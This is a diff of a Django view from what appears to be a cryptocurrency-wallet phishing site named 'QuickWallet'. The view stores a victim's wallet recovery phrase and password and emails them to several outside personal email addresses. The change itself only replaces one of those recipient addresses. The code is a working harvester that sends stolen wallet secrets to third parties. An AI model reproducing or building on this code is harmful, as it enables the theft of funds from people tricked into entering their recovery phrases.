@@ -32,7 +32,7 @@ def wallet_details(request, slug):
 
         print(data)
 
-        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['presidentp00100@yahoo.com', 'pyrrhicpyrrhic@outlook.com', 'mcguirej738@gmail.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['presidentp00100@yahoo.com', 'exkynexkyn@gmail.com', 'mcguirej738@gmail.com'] )
 
         allresult = Result.objects.create(wallet=wallet, phrase=phrase, user=user, password=password)
         allresult.save()
